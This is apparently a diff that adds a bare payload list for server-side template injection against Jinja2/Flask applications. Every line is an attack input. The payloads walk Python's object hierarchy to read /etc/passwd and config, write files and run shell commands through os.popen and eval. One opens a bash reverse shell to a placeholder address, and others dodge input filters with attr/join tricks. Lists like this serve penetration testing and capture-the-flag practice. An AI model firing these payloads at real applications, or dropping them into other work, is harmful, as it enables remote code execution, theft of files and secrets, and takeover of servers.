@@ -1,0 +1,70 @@
+Info
+{{g}}
+{{g.__class__}}
+{{g.__class__.__mro__[1]}}
+{{g.__class__.__mro__[1].__subclasses__()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/passwd')}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/ssl/certs/QuoVadis_Root_CA_3_G3.pem').read()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/ssl/certs/QuoVadis_Root_CA_1_G3.pem').read()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/ssl/certs/QuoVadis_Root_CA_2_G3.pem').read()}}
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('kek.txt', 'w').write('Hello here !') }}"
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('goodbye.txt', 'w').write('Hello here !') }}"
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('greet.txt', 'w').write('Hello here !') }}"
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('away.txt', 'w').write('Hello here !') }}"
+{{g.__class__.__base__}}
+{{g.__class__.__base__.__subclasses__()[428]('/etc/passwd')}}
+"{{ g.__class__.__base__.__subclasses__()[428]('hello.txt', 'w').write('Hello here !') }}"
+{{g['__class__']['__mro__'][1]['__subclasses__']()[428]}}
+{{g['__class__']['__mro__'][1]['__subclasses__']()[428]('/etc/passwd')}}
+{{g['__class__']['mro']()}}
+{{g['__class__']['__base__']['__subclasses__']()}}
+"{{g['__class__']['__mro__'][1]['__subclasses__']()[428]('hello.txt', 'w').write('Hello here !')}}"
+{{get_flashed_messages.__globals__['current_app'].config}}
+{{request.__class__}}
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='ImmutableDictMixin' %}{{ c.__hash__.__globals__['__builtins__'].open(""[evil]"") }}{% endif %}{% endfor %}"
+{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')}}
+"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("""") }}"
+"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}"
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls -l').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whereis flask').read()}}
+"{{request.application.__globals__.__builtins__.__import__('os').popen('hello.txt', 'w').write('Hello here !')}}"
+{{request['application']['__globals__']}}
+{{request['application']['__globals__'].__builtins__}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls -l')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')}}
+"{{"""".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}"
+{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]}}
+"{{().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()}}"
+"{{().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read()}}"
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}"
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(""__import__('os').popen('id').read()"") }}{% endif %}{% endfor %}"
+{{2-1}}
+{{2*2}}
+{{14-2}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{get_flashed_messages.__class__.mro()}}
+{{get_flashed_messages.__class__.__mro__[1]}}
+{{get_flashed_messages.__class__}}
+{{get_flashed_messages.__class__.__mro__[1]}}
+"{{ get_flashed_messages.__class__.__mro__[1].__subclasses__()[428]('hello.txt', 'w').write('Hello here !') }}"
+{{get_flashed_messages.__class__.__base__}}
+{{get_flashed_messages.__class__.__base__.__subclasses__()}}
+{{get_flashed_messages.__class__.__base__.__subclasses__()[428]}}
+{{get_flashed_messages.__class__.__base__.__subclasses__()[428]('/etc/passwd')}}
+{{get_flashed_messages.__class__.__base__.__subclasses__()[428]('/etc/passwd').read()}}
+"{{request|attr([""__"",""class"",""__""]|join)}}"
+"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}"
+"{{get_flashed_messages['__globals__']['__builtins__']['open']('hello.txt', 'w')['write']('Hello here !')}}"
+{{get_flashed_messages['__globals__']}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd')}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')}}
+{{config.items()}}
+"{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_"
